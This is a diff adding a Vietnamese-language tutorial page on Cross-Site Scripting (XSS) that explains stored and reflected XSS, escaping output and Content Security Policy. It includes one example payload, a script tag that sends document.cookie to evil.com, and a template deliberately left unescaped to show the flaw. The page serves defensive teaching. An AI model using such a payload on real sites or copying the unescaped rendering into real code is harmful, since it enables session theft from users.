@@ -1,0 +1,71 @@
+---
+id: concept-xss
+title: "Cross-Site Scripting (XSS)"
+type: "concept"
+aliases: ["XSS", "cross-site scripting", "tấn công XSS", "chèn script độc hại trình duyệt", "stored XSS reflected XSS", "Content Security Policy phòng XSS"]
+tags: [security, owasp, xss, web-security, javascript, csp, injection]
+status: published
+---
+import Callout from '../../components/content/Callout.astro';
+
+Bạn đến một quán cà phê và thấy bảng menu viết tay. Ai đó đã lẻn vào tối qua và viết thêm một dòng: "Gọi món bất kỳ, tự động chuyển khoản 200k cho số tài khoản X." Khách hàng đến đọc bảng, làm theo — và không ai biết dòng đó là của kẻ xấu, vì nó xuất hiện trên bảng *của quán*.
+
+XSS hoạt động y như vậy: kẻ tấn công nhúng script độc hại vào trang web của bạn, và **trình duyệt của nạn nhân thực thi script đó** vì nghĩ nó đến từ trang web đáng tin cậy.
+
+## Là gì
+
+**Cross-Site Scripting (XSS)** là lỗ hổng cho phép kẻ tấn công chèn mã JavaScript độc hại vào trang web, và mã đó chạy trong trình duyệt của người dùng khác. Vì script chạy trong ngữ cảnh của trang web gốc, nó có thể đánh cắp cookie/session, thay đổi giao diện trang, hoặc thực hiện hành động thay mặt nạn nhân.
+
+Có hai loại chính:
+
+- **Stored XSS**: script độc hại được lưu vào database (ví dụ: bình luận, hồ sơ người dùng) và hiển thị cho mọi người truy cập. Nguy hiểm nhất vì tự động lây lan.
+- **Reflected XSS**: script nằm trong URL/request, server "phản chiếu" nó về response mà không lọc. Kẻ tấn công gửi link độc hại cho nạn nhân.
+
+## Ví dụ thật
+
+App có tính năng bình luận. Code hiển thị bình luận như sau:
+
+```html
+<!-- NGUY HIỂM — render nội dung người dùng không escape -->
+<div class="comment">{{ comment.text }}</div>
+```
+
+Kẻ tấn công gửi bình luận:
+
+```html
+<script>document.location='https://evil.com/steal?c='+document.cookie</script>
+```
+
+Mọi người dùng khác xem bài viết đó — trình duyệt của họ chạy script, gửi cookie về server của kẻ tấn công. Kẻ tấn công dùng cookie để giả mạo phiên đăng nhập.
+
+**Cách phòng — luôn escape đầu ra:**
+
+```html
+<!-- AN TOÀN — escape HTML trước khi render -->
+<div class="comment">{{ comment.text | escape }}</div>
+```
+
+Hầu hết template engine (Jinja2, Handlebars, Blade...) escape tự động theo mặc định. Nguy hiểm nằm ở những chỗ bạn dùng `| safe`, `dangerouslySetInnerHTML`, hay `innerHTML =` mà không kiểm tra kỹ.
+
+Lớp phòng thủ thứ hai: **Content Security Policy (CSP)** — header HTTP báo cho trình duyệt chỉ được chạy script từ những nguồn bạn tin tưởng, chặn script inline không được phép.
+
+<Callout title="Cẩn thận">
+Đừng nghĩ "chỉ có bình luận mới bị XSS". Bất kỳ đầu vào nào hiển thị lại trên trang — tên người dùng, tiêu đề bài viết, tham số URL, thậm chí thông báo lỗi — đều có thể là điểm tấn công. Quy tắc: **không bao giờ tin tưởng đầu vào, luôn escape đầu ra**.
+</Callout>
+
+<Callout title="Nhớ nhé">
+Phòng XSS theo hai lớp: (1) escape mọi đầu ra người dùng đúng ngữ cảnh, (2) thêm CSP header để hạn chế thiệt hại nếu lớp đầu bị vượt qua.
+</Callout>
+
+## Đọc thêm
+
+- [Cross-Site Scripting (XSS) — PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting) — Giải thích toàn diện về XSS với lab thực hành tương tác; phân tích stored/reflected/DOM-based XSS chi tiết.
+- [How to Prevent XSS — PortSwigger](https://portswigger.net/web-security/cross-site-scripting/preventing) — Hướng dẫn phòng chống XSS thực tế: output encoding, input validation, CSP; súc tích và đủ dùng.
+- [Cross-Site Scripting (XSS) — MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS) — Tài liệu từ MDN giải thích XSS từ góc độ web platform, bao gồm cơ chế same-origin policy và cách CSP hoạt động.
+- [Content Security Policy — PortSwigger](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) — Hướng dẫn CSP chi tiết: cách viết policy, bypass phổ biến cần tránh, và ví dụ cấu hình thực tế.
+
+## Tự kiểm tra
+
+1. Sự khác biệt giữa Stored XSS và Reflected XSS là gì? Loại nào nguy hiểm hơn và tại sao?
+2. Bạn dùng React và viết `<div dangerouslySetInnerHTML={{ __html: userInput }} />`. Điều gì có thể xảy ra? Cách xử lý đúng là gì?
+3. CSP (Content Security Policy) phòng XSS như thế nào? Nó có thể thay thế hoàn toàn việc escape đầu ra không?
